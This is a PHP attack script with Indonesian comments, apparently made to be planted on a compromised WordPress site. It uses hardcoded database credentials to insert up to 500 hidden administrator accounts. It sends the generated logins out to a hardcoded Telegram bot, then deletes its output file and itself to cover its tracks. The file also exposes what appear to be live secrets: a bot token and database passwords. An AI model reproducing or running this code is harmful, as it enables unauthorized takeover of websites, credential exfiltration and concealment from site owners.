<?php
// === KONFIGURASI ERROR HANDLING ===
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
date_default_timezone_set("Asia/Jakarta");

// === FUNGSI UNTUK HANDLE ERROR ===
function handleError($message) {
    file_put_contents('error_log.txt', date('Y-m-d H:i:s') . " - " . $message . "\n", FILE_APPEND);
    return false;
}

// === KONFIG TELEGRAM ===
$token   = '8577347348:AAGN-860vmxn_M1nwAVo99jMn-E6casAPqs';
$chat_id = '8130137884';

// === DATABASE DARI wp-config.php ===
$db_name = 'u692586828_VNHRN';
$db_user = 'u692586828_7noEx';
$db_pass = 'CvSs0UmKBl';
$db_host = '127.0.0.1';
$prefix  = 'wp_';

// === KONEKSI DATABASE DENGAN ERROR HANDLING ===
try {
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    if ($conn->connect_error) {
        throw new Exception("Database connection failed: " . $conn->connect_error);
    }
    $conn->set_charset("utf8");
} catch (Exception $e) {
    handleError("Database Error: " . $e->getMessage());
    exit("❌ Gagal konek ke database! Silakan cek konfigurasi.");
}

// === LOAD HASHER WP DENGAN ERROR HANDLING ===
$wp_hasher_path = 'wp-includes/class-phpass.php';
if (!file_exists($wp_hasher_path)) {
    // Coba path alternatif
    $wp_hasher_path = '../wp-includes/class-phpass.php';
    if (!file_exists($wp_hasher_path)) {
        handleError("File class-phpass.php tidak ditemukan");
        exit("❌ File class-phpass.php tidak ditemukan di lokasi standar.");
    }
}

try {
    require_once($wp_hasher_path);
    if (!class_exists('PasswordHash')) {
        throw new Exception("Class PasswordHash tidak ditemukan");
    }
    $hasher = new PasswordHash(8, true);
} catch (Exception $e) {
    handleError("Hasher Error: " . $e->getMessage());
    exit("❌ Gagal memuat password hasher.");
}

// === RANDOM STRING YANG AMAN ===
function rand_str($len = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $result = '';
    $max = strlen($characters) - 1;
    for ($i = 0; $i < $len; $i++) {
        $result .= $characters[random_int(0, $max)];
    }
    return $result;
}

// === INFO DOMAIN & IP ===
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());

// === BUAT AKUN ADMIN (500x) DENGAN ERROR HANDLING ===
$accounts = "";
$success_count = 0;
$max_attempts = 500;

for ($i = 1; $i <= $max_attempts; $i++) {
    try {
        $user  = 'admin_' . rand_str(6);
        $email = $user . '@' . rand_str(5) . '.com';
        $pass  = rand_str(12);
        $hash  = $hasher->HashPassword($pass);

        // Insert user
        $user_sql = "INSERT INTO `{$prefix}users` (user_login, user_pass, user_nicename, user_email, user_status, display_name) 
                     VALUES (?, ?, ?, ?, 0, ?)";
        $stmt = $conn->prepare($user_sql);
        if (!$stmt) {
            throw new Exception("Prepare user failed: " . $conn->error);
        }
        
        $stmt->bind_param("sssss", $user, $hash, $user, $email, $user);
        if (!$stmt->execute()) {
            // Skip jika username/email sudah ada
            if ($conn->errno == 1062) {
                $stmt->close();
                continue;
            }
            throw new Exception("Execute user failed: " . $conn->error);
        }
        
        $uid = $conn->insert_id;
        $stmt->close();

        // Insert user meta capabilities
        $capabilities_sql = "INSERT INTO `{$prefix}usermeta` (user_id, meta_key, meta_value) 
                            VALUES (?, ?, 'a:1:{s:13:\"administrator\";b:1;}')";
        $stmt = $conn->prepare($capabilities_sql);
        if (!$stmt) {
            throw new Exception("Prepare capabilities failed: " . $conn->error);
        }
        $meta_key = $prefix . 'capabilities';
        $stmt->bind_param("is", $uid, $meta_key);
        if (!$stmt->execute()) {
            throw new Exception("Execute capabilities failed: " . $conn->error);
        }
        $stmt->close();

        // Insert user level
        $level_sql = "INSERT INTO `{$prefix}usermeta` (user_id, meta_key, meta_value) 
                     VALUES (?, ?, '10')";
        $stmt = $conn->prepare($level_sql);
        if (!$stmt) {
            throw new Exception("Prepare level failed: " . $conn->error);
        }
        $level_key = $prefix . 'user_level';
        $stmt->bind_param("is", $uid, $level_key);
        if (!$stmt->execute()) {
            throw new Exception("Execute level failed: " . $conn->error);
        }
        $stmt->close();

        $accounts .= "$user|$email|$pass\n";
        $success_count++;

    } catch (Exception $e) {
        handleError("Account creation error: " . $e->getMessage());
        // Continue dengan akun berikutnya meski ada error
        continue;
    }
}

// === SIMPAN KE FILE TEKS ===
$filename = "wp_accounts_" . time() . ".txt";
if (!file_put_contents($filename, $accounts)) {
    handleError("Failed to create file: " . $filename);
    exit("❌ Gagal membuat file akun.");
}

// === KIRIM KE TELEGRAM DENGAN ERROR HANDLING ===
$message = "🚨 WordPress Access Detected\n";
$message .= "🌐 Domain: https://$domain\n";
$message .= "📡 Server IP: $ip\n";
$message .= "🔐 Berhasil dibuat: $success_count/$max_attempts Akun Admin\n";
$message .= "📁 File: $filename";

$telegram_success = false;

// Kirim pesan notifikasi
try {
    $send_msg = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
    if ($send_msg === FALSE) {
        throw new Exception("Failed to send message");
    }
} catch (Exception $e) {
    handleError("Telegram message error: " . $e->getMessage());
}

// Kirim file teks
try {
    if (!extension_loaded('curl')) {
        throw new Exception("CURL extension not loaded");
    }

    $url = "https://api.telegram.org/bot$token/sendDocument";
    $post_data = [
        'chat_id' => $chat_id,
        'document' => new CURLFile(realpath($filename)),
        'caption' => "$success_count WordPress Accounts - $domain"
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $post_data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    
    $send_file = curl_exec($ch);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($send_file && strpos($send_file, '"ok":true') !== false) {
        $telegram_success = true;
    } else {
        throw new Exception("CURL Error: " . $curl_error);
    }
    
} catch (Exception $e) {
    handleError("Telegram file error: " . $e->getMessage());
}

// === HAPUS FILE & OUTPUT ===
if ($telegram_success) {
    echo "<b>✅ $success_count Akun admin berhasil dibuat & dikirim ke Telegram.</b><br>";
    echo "<b>📊 Success Rate: " . round(($success_count/$max_attempts)*100, 2) . "%</b><br>";
    
    // Hapus file dengan safety check
    if (file_exists($filename)) {
        @unlink($filename);
    }
    if (file_exists(__FILE__)) {
        @unlink(__FILE__);
    }
    echo "<b>🗑️ File telah dihapus otomatis.</b>";
} else {
    echo "<b>⚠️ $success_count Akun dibuat tapi gagal kirim ke Telegram.</b><br>";
    echo "<b>📊 Success Rate: " . round(($success_count/$max_attempts)*100, 2) . "%</b><br>";
    echo "<b>💾 File disimpan sebagai: $filename</b>";
}

// Tutup koneksi database
if (isset($conn)) {
    $conn->close();
}
?>
